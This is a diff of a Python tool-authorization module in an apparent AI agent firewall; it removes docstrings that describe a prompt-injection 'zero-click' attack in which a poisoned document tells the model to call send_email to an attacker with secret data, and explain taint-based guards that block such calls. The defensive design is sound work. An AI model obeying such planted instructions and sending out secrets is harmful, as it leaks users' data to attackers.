@@ -1,21 +1,3 @@
-"""Layer 4: tool authorization. The model requests, the firewall decides.
-
-The usual pattern in agent frameworks is "the model asks for a tool, and
-the tool runs" — trust is implicit. Here, every tool call the model wants
-to make has to clear a guard *before* it runs, and the guard is chosen by
-the developer per-tool, not inferred from the request text. This is the
-layer that stops the "zero-click" attack shape: a poisoned document tells
-the model to call `send_email(to=attacker, body=secret)`, and because the
-context is already tainted by that document, the call never executes —
-no matter how politely or convincingly the document phrased the request.
-
-Guards never look at *what the tool call says* to decide. They look at
-*what the context has already seen* (taint) and *what the developer
-declared allowed* (schema/effects). That's what makes this layer hold up
-against an attacker who rephrases: rephrasing changes the text, not the
-taint.
-"""
-
 from __future__ import annotations
 
 from dataclasses import dataclass, field
@@ -54,10 +36,6 @@ def authorize(
     forbidden_effects: frozenset[str] = frozenset(),
     user_confirmed: bool = False,
 ) -> list[Finding]:
-    """Returns an empty list if the call is authorized, or one or more
-    invariant Findings explaining why it isn't. Every path here is a
-    structural check — taint, a boolean the host set, or a value not in
-    an allow-list — never a read of the call's own text for "intent."""
     findings: list[Finding] = []
 
     blocked_effects = spec.effects & forbidden_effects
